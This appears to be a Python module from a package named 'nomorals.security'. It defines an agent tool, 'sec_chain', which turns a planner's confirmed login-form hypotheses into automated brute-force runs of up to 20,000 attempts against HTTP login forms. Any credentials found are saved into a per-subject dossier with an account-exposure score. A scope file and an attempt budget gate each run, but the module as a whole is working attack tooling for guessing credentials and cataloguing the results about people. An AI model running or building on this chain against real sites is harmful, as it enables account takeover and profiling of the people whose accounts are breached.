"""Planner drives the attack, the attack feeds the dossier.

One function, :func:`run_chain`, is the whole engagement loop for one
case:

1. The planner ledger is the work queue — :func:`plan_next` returns
   the top hypothesis. A confirmed hypothesis of class ``login_form``
   carries its target (a URL) and its confirmed params (form field
   names, path, method, in the hypothesis ``param`` field as
   ``user=<field> pass=<field> path=<path> method=<method>``).
2. The hypothesis becomes an attacker run: the confirmed params feed
   :func:`run_attack` directly (no hand-copying), under the case's
   scope file and Governor budget, with the checkpoint + found pairs
   in the case dir.
3. The run's outcome resolves the hypothesis in the ledger
   (confirmed/failed) — and, when credentials are found, they land in
   the case dossier via :meth:`Dossier.record_credentials`, so the
   account-exposure score counts them.

A case is one folder: scope file, planner ledger, findings and the
attacker's JSONL checkpoint all live under
``<home>/data/evidence/<case>/`` (see :mod:`nomorals.security.case`).
"""
from __future__ import annotations

import json
import re
import urllib.parse
from pathlib import Path
from typing import Any

from ..core.errors import ToolError
from ..core.policy import Capability
from .case import attacker_paths, case_dir, governor_for, resolve_scope
from .dossier import Dossier, save_dossier
from .planner import Hypothesis, Ledger

__all__ = ["run_chain", "chain_for_case", "register"]


def _dossier_slug(subject: str) -> str:
    """The filename slug save_dossier() uses — same rule, so the chain
    finds the dossier it saved last time."""
    return (re.sub(r"[^a-z0-9._\-]+", "-", subject.lower()).strip("-")
            or "dossier")


def _load_or_new_dossier(root: Path, subject: str) -> Dossier:
    """The case's dossier for a subject, or a fresh empty one (no
    network — the chain only records found credentials; a full
    dossier_build is a separate step)."""
    path = root / f"{_dossier_slug(subject)}.json"
    if path.is_file():
        data = json.loads(path.read_text(encoding="utf-8"))
        return Dossier(subject=data.get("subject", subject),
                       kind=data.get("kind", "username"),
                       platforms=data.get("platforms", []),
                       exposure=data.get("exposure", {}),
                       profile=data.get("profile", {}),
                       score=data.get("score", 0),
                       tier=data.get("tier", "low"),
                       notes=data.get("notes", []))
    return Dossier(subject=subject)


def _parse_login_param(param: str) -> dict[str, str]:
    """``user=<field> pass=<field> path=<path> method=<method>``."""
    out: dict[str, str] = {}
    for token in (param or "").split():
        if "=" in token:
            key, _, value = token.partition("=")
            out[key.strip().lower()] = value.strip()
    return out


def _hypothesis_target_url(hyp: Hypothesis) -> str:
    """The hypothesis target is a URL (``https://host/login``) or a
    bare host (``host`` / ``host:8443``) — both resolve to a URL."""
    target = (hyp.target or "").strip()
    if not target:
        raise ToolError(f"hypothesis {hyp.id} has no target")
    if "://" not in target:
        target = "http://" + target
    return target


def chain_for_case(home: str | Path, case: str) -> dict[str, Any]:
    """What the chain will do next for a case, without running it:
    the top hypothesis, its parsed login params, the scope file it
    will run under. A refusal here (no scope, no hypothesis) names
    the reason before anything fires."""
    root = case_dir(home, case)
    ledger = Ledger(root / "hypotheses.jsonl")
    nxt = ledger.next(1)
    if not nxt:
        return {"case": case, "next": None,
                "note": "no open hypotheses in the ledger"}
    hyp = nxt[0]
    scope = resolve_scope(home, case=case)
    return {"case": case, "next": hyp.as_dict(),
            "login_params": _parse_login_param(hyp.param),
            "target_url": _hypothesis_target_url(hyp),
            "scope": scope.as_dict(), "dir": str(root)}


def run_chain(home: str | Path, case: str, *, usernames: str,
              passwords: str = "", wordlist: str = "",
              fail_string: str = "", limit: int = 1,
              max_attempts: int = 20_000,
              dossier_subject: str = "",
              attack_fn: Any = None) -> dict[str, Any]:
    """Run the next `limit` login_form hypotheses for a case as
    attacker runs. Each run resolves its hypothesis; found
    credentials land in the case dossier. Returns the runs + the
    dossier's new score.

    `attack_fn` is the attacker runner, injected by the L4 caller
    (tools/security.py passes tools.attacker.run_attack): security/
    is L3 and may not import tools/ (L4) — not even lazily, the
    layering scan reads import statements wherever they sit.
    """
    if attack_fn is None:
        raise ToolError("sec_chain needs the attacker runner — "
                        "wire run_attack through tools/security.py")
    home = str(home)
    root = case_dir(home, case)
    ledger = Ledger(root / "hypotheses.jsonl")
    scope = resolve_scope(home, case=case)
    runs: list[dict[str, Any]] = []
    for _ in range(max(1, limit)):
        nxt = ledger.next(1)
        if not nxt:
            break
        hyp = nxt[0]
        if hyp.cls != "login_form":
            runs.append({"hypothesis": hyp.id, "skipped": True,
                         "note": f"class {hyp.cls!r} is not a login form — "
                                 f"the chain only attacks login forms"})
            ledger.resolve(hyp.id, confirmed=False,
                           note="skipped by the attack chain: not a login form")
            continue
        url = _hypothesis_target_url(hyp)
        parsed = _parse_login_param(hyp.param)
        split = urllib.parse.urlsplit(url)
        host = split.hostname or ""
        port = split.port or (443 if split.scheme == "https" else 80)
        paths = attacker_paths(home, case, host)
        gov = governor_for(scope, max_total=max_attempts,
                           max_per_host=1000.0)
        result = attack_fn(
            host, port=port, protocol="http_form",
            usernames=usernames, passwords=passwords, wordlist=wordlist,
            path=parsed.get("path") or split.path or "/",
            method=parsed.get("method") or "POST",
            form_user=parsed.get("user") or "username",
            form_pass=parsed.get("pass") or "password",
            fail_string=fail_string, out_file=paths["out_file"],
            resume_file=paths["resume_file"], quiet=True,
            max_attempts=max_attempts, governor=gov)
        found = result.get("found") or []
        item = ledger.resolve(
            hyp.id, confirmed=bool(found),
            note=(f"attack found {len(found)} credential(s)"
                  if found else "attack found nothing"))
        runs.append({"hypothesis": hyp.id, "target": url,
                     "resolved": item.as_dict() if item else None,
                     "attempts": result.get("attempts"),
                     "found": found, "note": result.get("note", "")})
        if found:
            subject = dossier_subject or host
            dossier = _load_or_new_dossier(root, subject)
            dossier.record_credentials(host, found)
            save_dossier(dossier, root)
    return {"case": case, "dir": str(root), "runs": runs}


def register(registry: Any, attack_fn: Any = None) -> None:
    from .case import home_of

    context = registry.context

    @registry.register(
        "sec_chain",
        description="Run a case's next login-form hypotheses as attacker "
                    "runs: the planner ledger is the queue, confirmed "
                    "login params feed the brute directly, each run "
                    "resolves its hypothesis, and found credentials land "
                    "in the case dossier. Scope is the case's scope.txt — "
                    "refuses without it.",
        capability=Capability.NET_OUT,
        parameters={"case": "str", "usernames": "str — comma list",
                    "passwords": "str (optional) — comma list",
                    "wordlist": "str (optional) — path to a password file",
                    "fail_string": "str (optional)",
                    "limit": "int (optional, 1) — hypotheses to run",
                    "max_attempts": "int (optional, 20000)",
                    "dossier_subject": "str (optional)"},
    )
    def sec_chain(case: str, usernames: str, *, passwords: str = "",
                  wordlist: str = "", fail_string: str = "",
                  limit: str = "1", max_attempts: str = "20000",
                  dossier_subject: str = "") -> dict[str, Any]:
        return run_chain(home_of(context), case, usernames=usernames,
                         passwords=passwords, wordlist=wordlist,
                         fail_string=fail_string, limit=int(limit or 1),
                         max_attempts=int(max_attempts or 20000),
                         dossier_subject=dossier_subject,
                         attack_fn=attack_fn)
